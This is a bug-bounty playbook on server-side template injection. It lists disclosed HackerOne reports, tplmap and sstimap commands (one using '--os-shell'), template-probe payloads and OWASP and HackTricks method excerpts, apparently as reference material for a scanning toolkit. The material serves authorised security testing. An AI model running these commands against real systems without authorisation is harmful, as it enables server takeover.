# Real-World Playbook — SSTI (Template Injection)

**Class:** `ssti` · **Coverage-matrix tier:** 1 · **Hunter2:** vuln_scanner.sh · **Skill:** web2-vuln-classes
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Why it pays (real bounty signal)
Top disclosed SSTI reports peak at **$2,300**. Rewarded across: GitHub Security Lab, Glovo, HubSpot Inactive, Mail.ru, Node.js third-party modules, Ruby on Rails, Shopify, Unikrn.

## How real hackers found it — top disclosed reports
*(title = the actual technique; open the report for the full PoC)*

- **[Ruby]: Server Side Template Injection** — GitHub Security Lab, $2,300 · 13👍 · [1928279](https://hackerone.com/reports/1928279)
- **Path traversal, SSTI and RCE on a MailRu acquisition** — Mail.ru, $2,000 · 152👍 · [536130](https://hackerone.com/reports/536130)
- **H1514 Server Side Template Injection in Return Magic email templates?** — Shopify, $0 (disclosed) · 409👍 · [423541](https://hackerone.com/reports/423541)
- **Urgent: Server side template injection via Smarty template allows for RCE** — Unikrn, $0 (disclosed) · 122👍 · [164224](https://hackerone.com/reports/164224)
- **Reflected XSS and Server Side Template Injection  in all HubSpot CMSes** — HubSpot Inactive, $0 (disclosed) · 64👍 · [399462](https://hackerone.com/reports/399462)
- **Python : Add query to detect Server Side Template Injection** — GitHub Security Lab, $0 (disclosed) · 29👍 · [944359](https://hackerone.com/reports/944359)
- **Server Side Template Injection on Name parameter during Sign Up process** — Glovo, $0 (disclosed) · 27👍 · [1104349](https://hackerone.com/reports/1104349)
- **SSTI leads to Command injection** — curl, $0 (disclosed) · 24👍 · [3584149](https://hackerone.com/reports/3584149)
- **CodeQL query to detect Server-Side Template Injections (JavaScript)** — GitHub Security Lab, $0 (disclosed) · 8👍 · [894872](https://hackerone.com/reports/894872)
- **Server-side Template Injection in lodash.js** — Node.js third-party modules, $0 (disclosed) · 8👍 · [904672](https://hackerone.com/reports/904672)
- **Server-side template injection at ujs test server** — Ruby on Rails, $0 (disclosed) · 5👍 · [942103](https://hackerone.com/reports/942103)
- **Java : Add query to detect Server Side Template Injection (SSTI)** — GitHub Security Lab, $0 (disclosed) · 4👍 · [1490372](https://hackerone.com/reports/1490372)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
  tinja url -u "http://example.com/?name=Kirlia" -H "Authentication: Bearer ey..."
  tinja url -u "http://example.com/" -d "username=Kirlia"  -c "PHPSESSID=ABC123..."
```
```
  python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
  python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```
```
  python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
  python3 ./sstimap.py -i -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
  python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
```
```
${{<%[%'"}}%\.
```
```
{{ ... }}
${ ... }
#{ ... }
<%= ... %>
{ ... }
{{= ... }}
{= ... }
\n= ... \n
*{ ... }
@{ ... }
@( ... )
```
```
7 * 7
```
```
(1/0).zxy.zxy
```
```
${{<%[%'"}}%\.
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### Server-side Template Injection

|ID          |
|------------|
|WSTG-INJT-18|

#### Summary

Web applications commonly use server-side templating technologies (Jinja2, Twig, FreeMaker, etc.) to generate dynamic HTML responses. Server-side Template Injection vulnerabilities (SSTI) occur when user input is embedded in a template in an unsafe manner and results in remote code execution on the server. Any features that support advanced user-supplied markup may be vulnerable to SSTI including wiki-pages, reviews, marketing applications, CMS systems etc. Some template engines employ various mechanisms (eg. sandbox, allow listing, etc.) to protect against SSTI.

##### Example - Twig

The following example is an excerpt from the [Extreme Vulnerable Web Application](https://github.com/s4n7h0/xvwa) project.

```php
public function getFilter($name)
{
        [snip]
        foreach ($this->filterCallbacks as $callback) {
        if (false !== $filter = call_user_func($callback, $name)) {
            return $filter;
        }
    }
    return false;
}
```

In the getFilter function the `call_user_func($callback, $name)` is vulnerable to SSTI: the `name` parameter is fetched from the HTTP GET request and executed by the server:

*Figure 4.7.18-1: SSTI XVWA Example*

##### Example - Flask/Jinja2

The following example uses Flask and Jinja2 templating engine. The `page` function accepts a 'name' parameter from an HTTP GET request and renders an HTML response with the `name` variable content:

```python
@app.route("/page")
def page():
    name = request.values.get('name')
    output = Jinja2.from_string('Hello ' + name + '!').render()
    return output
```

This code snippet is vulnerable to XSS but it is also vulnerable to SSTI. Using the following as a payload in the `name` parameter:

```bash
$ curl -g 'https://www.target.com/page?name={{7*7}}'
Hello 49!
```

#### Test Objectives

- Detect template injection vulnerability points.
- Identify the templating engine.
- Build the exploit.

#### How to Test

SSTI vulnerabilities exist either in text or code context. In plaintext context users allowed to use freeform 'text' with direct HTML code. In code context the user input may also be placed within a template statement (eg. in a variable name)


*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### SSTI (Server Side Template Injection)


#### What is SSTI (Server-Side Template Injection)

Server-side template injection is a vulnerability that occurs when an attacker can inject malicious code into a template that is executed on the server. This vulnerability can be found in various technologies, including Jinja.

Jinja is a popular template engine used in web applications. Let's consider an example that demonstrates a vulnerable code snippet using Jinja:

```python
output = template.render(name=request.args.get('name'))
```

In this vulnerable code, the `name` parameter from the user's request is directly passed into the template using the `render` function. This can potentially allow an attacker to inject malicious code into the `name` parameter, leading to server-side template injection.

For instance, an attacker could craft a request with a payload like this:

```
http://vulnerable-website.com/?name={{bad-stuff-here}}
```

The payload `{{bad-stuff-here}}` is injected into the `name` parameter. This payload can contain Jinja template directives that enable the attacker to execute unauthorized code or manipulate the template engine, potentially gaining control over the server.

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- SSTI → **RCE** (Jinja2/Twig/Freemarker gadget)
- Sandboxed SSTI → file read / SSRF at minimum

## Hunter2 wiring
- **Run:** `vuln_scanner.sh`
- **Skill:** `web2-vuln-classes`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)
